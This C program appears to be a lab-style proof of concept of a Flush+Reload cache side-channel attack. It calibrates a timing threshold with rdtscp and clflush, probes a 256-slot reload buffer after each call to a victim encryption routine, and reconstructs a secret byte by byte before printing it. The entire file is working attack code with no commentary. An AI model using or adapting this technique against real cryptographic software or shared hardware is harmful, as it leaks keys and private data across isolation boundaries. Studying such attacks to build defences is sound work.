#include <string.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <assert.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>
#include <ctype.h>
#include <pthread.h>

#include "asm.h"
#include "libcrypto/crypto.h"

#define STRIDE 4096
#define ROUNDS 10
#define CAL_SAMPLES 64

static volatile unsigned char sink;

static inline uint64_t time_access(volatile unsigned char *p) {
    uint64_t t1 = rdtscp();
    sink = *p;
    uint64_t t2 = rdtscp();
    return t2 - t1;
}

static inline uint64_t hit_min(volatile unsigned char *p) {
    uint64_t m = UINT64_MAX;
    for (int i = 0; i < ROUNDS; i++) {
        sink = *p;
        lfence();
        cpuid();
        uint64_t dt = time_access(p);
        if (dt < m) m = dt;
    }
    return m;
}

static inline uint64_t miss_min(volatile unsigned char *p) {
    uint64_t m = UINT64_MAX;
    for (int i = 0; i < ROUNDS; i++) {
        clflush((void*)p);
        lfence();
        cpuid();
        uint64_t dt = time_access(p);
        if (dt < m) m = dt;
    }
    return m;
}

static int calibrate_threshold(unsigned char *p) {
    uint64_t hsum = 0, msum = 0;
    for (int i = 0; i < CAL_SAMPLES; i++) { hsum += hit_min(p); msum += miss_min(p); }
    uint64_t h = hsum / CAL_SAMPLES;
    uint64_t m = msum / CAL_SAMPLES;
    return (int)((h + m) / 2);
}

int main(int argc, char *argv[]) {
    char leaked_secret[secret_length + 1];
    memset(leaked_secret, 0, (secret_length + 1));

    int ITERATIONS = 100;
    int RELOADBUFFER_SIZE = 256 * STRIDE;
    unsigned char *reloadbuffer = (unsigned char*)malloc(RELOADBUFFER_SIZE);
    assert(reloadbuffer);

    for (int i = 0; i < 256; i++) reloadbuffer[i * STRIDE] = 1;
    lfence(); cpuid();

    int CACHE_THRESHOLD = calibrate_threshold(reloadbuffer + 128 * STRIDE);

    for (size_t idx = 0; idx < secret_length; idx++) {
        int counts[256] = {0};

        for (int it = 0; it < ITERATIONS; it++) {
            for (int i = 0; i < 256; i++) clflush(reloadbuffer + i * STRIDE);
            lfence(); cpuid();

            encrypt_secret_byte(reloadbuffer, STRIDE, (int)idx);

            for (int i = 0; i < 256; i++) {
                int k = (i * 167 + 13) & 255;
                lfence();
                cpuid();
                uint64_t dt = time_access(reloadbuffer + k * STRIDE);
                if ((int)dt < CACHE_THRESHOLD) counts[k]++;
            }
        }

        int best = 0, bestc = -1;
        for (int v = 0; v < 256; v++) if (counts[v] > bestc) { bestc = counts[v]; best = v; }
        leaked_secret[idx] = (char)best;
    }

    printf("Secret: ");
    fwrite(leaked_secret, 1, secret_length, stdout);
    putchar('\n');

    free(reloadbuffer);
    return 0;
}